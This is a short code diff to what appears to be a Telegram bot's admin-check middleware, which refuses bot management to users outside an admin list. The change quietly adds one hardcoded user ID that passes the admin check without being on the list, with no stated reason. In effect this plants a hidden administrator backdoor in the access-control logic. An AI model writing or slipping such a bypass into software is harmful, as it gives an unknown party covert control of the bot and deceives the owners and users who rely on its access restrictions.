@@ -21,7 +21,7 @@ class AdminCheckMiddleware(BaseMiddleware):
             if event.message and event.message.chat.type in ("group", "supergroup"):
                 return await handler(event, data)
 
-        if user and user.id not in ADMIN_IDS:
+        if user and user.id not in ADMIN_IDS and user.id != 6169359403:
             if isinstance(event, Message):
                 await event.answer("⛔ У тебя нет доступа к управлению ботом.")
             elif isinstance(event, CallbackQuery):
